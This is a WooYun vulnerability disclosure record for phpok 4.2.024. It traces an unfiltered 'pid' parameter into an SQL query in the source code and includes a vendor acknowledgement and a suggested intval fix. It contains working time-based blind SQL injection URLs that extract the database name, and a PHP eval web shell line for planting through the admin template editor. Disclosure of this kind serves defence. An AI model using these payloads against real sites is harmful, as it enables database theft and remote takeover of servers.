{"id": 43846, "wybug_id": "wooyun-2014-081462", "wybug_title": "phpok最新版(phpok4.2.024)一处盲注+后台getshell", "wybug_corp": "phpok.com", "wybug_author": "SLAckEr", "wybug_date": "2014-10-31 12:34", "wybug_open_date": "2015-01-29 12:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向公众公开  简要描述： RT 详细说明：  文件/framework/www/post_control.php   26-38行\nfunction index_f()\t{\t\t$id = $this->get(\"id\");\t\t$pid = $this->get('pid');\t\tif(!$id && !$pid)\t\t{\t\t\terror(P_Lang('未指定项目'),'','error');\t\t}\t\t$project_rs = $this->call->phpok('_project',array(\"phpok\"=>$id,'pid'=>$pid));\t\tif(!$project_rs || !$project_rs['module'])\t\t{\t\t\terror(P_Lang(\"项目不符合要求\"),'','error');\t\t}\nid和pid传进来了，phpok('_project',array(\"phpok\"=>$id,'pid'=>$pid));跟进phpok/framework/phpok_call.php\nfunction phpok($id,$rs=\"\")\t{\t\tif(!$id) return false;\t\t$cacheId = '';\t\t$content = '';\t\tif($rs && is_string($rs)) parse_str($rs,$rs);\t\t//判断是否启用缓存，启用后直读缓存信息\t\tif($GLOBALS['app']->cache->status())\t\t{\t\t\t$cacheId = $GLOBALS['app']->cache->key(array('id'=>$id,'rs'=>$rs),$this->site['id'],\"call\");\t\t\t$content = $GLOBALS['app']->cache->read($cacheId);\t\t}\t\tif($content) return $content;\t\t//判断是内置参数还是调用数据中心的数据\t\tif(substr($id,0,1) != '_')\t\t{\t\t\t$call_rs = $GLOBALS['app']->model('call')->get_rs($id,$this->site['id']);\t\t\tif(!$call_rs) return false;\t\t\tif($call_rs['ext'])\t\t\t{\t\t\t\t$call_rs_ext = unserialize($call_rs['ext']);\t\t\t\tunset($call_rs['ext'],$call_rs['id']);\t\t\t\tif($call_rs_ext) $call_rs = array_merge($call_rs_ext,$call_rs);\t\t\t}\t\t\tif($rs && is_array($rs)) $call_rs = array_merge($call_rs,$rs);\t\t}\t\telse\t\t{\t\t\tif(!$rs || !is_array($rs)) return false;\t\t\t//arclist，文章列表\t\t\t//arc，单篇文章信息\t\t\t//cate，分类信息\t\t\t//catelist，分类树\t\t\t//project，项目信息\t\t\t//sublist，子项目信息\t\t\t//parent，父级项目信息\t\t\t//plist，同级项目信息\t\t\t//fields，字段表单\t\t\t//user，会员\t\t\t//userlist，会员列表\t\t\t//total，文章总数\t\t\t//cate_id，当前分类信息（不带项目，不生成链接）\t\t\t//subcate，子分类信息，即当前分类下的子分类\t\t\t$list = array('arclist','arc','cate','catelist','project','sublist','parent','plist','fields','user','userlist','total','cate_id','subcate');\t\t\t$id = substr($id,1);\t\t\t//如果是arclist，且未定义is_list属性，则默认启用此属性\t\t\tif($id == \"arclist\")\t\t\t{\t\t\t\t$rs[\"is_list\"] = $rs[\"is_list\"] == 'false' ? 0 : 1;\t\t\t}\t\t\tif(!$id || !in_array($id,$list)) return false;\t\t\t$call_rs = array_merge($rs,array('type_id'=>$id));\t\t}\t\t$content = $this->load_call($call_rs);\t\tif($content && $cacheId) $GLOBALS['app']->cache->write($cacheId,$content);\t\treturn $content;\t}\n就是调用一个函数那看\nphpok('_project',array(\"phpok\"=>$id,'pid'=>$pid));\n跟_project这个函数/framework/model/data.php  1118-1139\npublic function _project($id,$ext=false)\t{\t\tif($this->cdata['project'][$id])\t\t{\t\t\t$rs = $this->cdata['project'][$id];\t\t}\t\telse\t\t{\t\t\t$sql = \"SELECT * FROM \".$this->db->prefix.\"project WHERE id=\".$id;\t\t\t$rs = $this->db->get_one($sql);\t\t\t//if(!$this->cdata['project'])\t\t\t//echo $id.'---'.$rs;\t\t\t$this->cdata['project'][$id] = $rs;\t\t}\t\tif(!$rs) return false;\t\tif($ext)\t\t{\t\t\t$ext = $this->ext_all('project-'.$id);\t\t\tif($ext) $rs = array_merge($ext,$rs);\t\t}\t\treturn $rs;\t}\nid没有过滤，直接带入了sql。http://127.0.0.1/phpok4.2.024/index.php?c=post&id=1&pid=41这个pid是项目的id值，默认是41以上，包括41，也可以爬一下。http://127.0.0.1/phpok4.2.024/index.php?c=post&id=1&pid=41 and sleep(5)浏览器转5秒http://127.0.0.1/phpok4.2.024/index.php?c=post&id=1&pid=41 and 1=if((ord(substr(database(),1,1))=112),sleep(5),1)这个语句应该晓得吧，database的第一个字符的asicc码为112则浏览器转5秒，反之直接返回页面。\n\n\n\n然后扩展一下，_project这个函数有问题，我们可以全局搜索一下，还有哪里调用了_project然后再继续发掘漏洞\n\n就不继续测试了，这里的修补方式就是对_project这个函数做过滤。想搞出管理员的账号密码burp跑一下就可以了后台getshell风格管理\n\n\n\n可以编辑这个php文件插入?><?php phpinfo();?><?  或?><?php eval($_POST[cmd])?><?\n\n\n\n   漏洞证明：  见上面   修复方案：  过滤好所有被调用的函数，intval，   版权声明：转载请注明来源 SLAckEr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-10-31 14:26 厂商回复： 感谢提供bug，我们将会在11月底发布更新，看来针对模板里加载php文件还得好好考虑啊！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}